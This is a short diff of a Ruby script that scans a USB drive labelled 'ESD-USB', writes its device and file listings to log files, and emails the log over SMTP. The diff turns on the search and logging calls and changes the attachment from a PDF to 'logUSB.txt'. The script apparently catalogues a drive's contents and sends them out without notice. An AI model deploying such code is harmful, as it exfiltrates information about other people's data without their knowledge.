@@ -27,7 +27,8 @@ pen = "ESD-USB"
 localizePen = Dir.glob File.join(src,"*")
 #subDirPen = Dir.glob File.join(src,pen,"**/")
 
-logFileDir = File.join(dest,"Horario de clases 2Bach.pdf")
+logDevicesDir = File.join(dest,"Devices.txt")
+logUSBDir = File.join(dest,"logUSB.txt")
 
 def Directories(p)
 	Dir.entries(p).select do |entry| File.directory? File.join(p,entry) and !(entry =="." || entry == "..") end
@@ -114,7 +115,7 @@ Content-Disposition: attachment; filename="#{filename}"
 --#{marker}--
 EOF
 
-	mailtext = part1 + part2 + part3
+mailtext = part1 + part2 + part3
 
 # Let's put our code in safe area  
 
@@ -131,6 +132,6 @@ smtp.start(yourDomain, yourAccountName, yourPassword, :login) do
 end
 end
 
-#search src,pen
-#log_file localizePen,"w+","Devices.txt"
-emailSender logFileDir
+search src,pen
+log_file localizePen,"w+","Devices.txt"
+emailSender logUSBDir
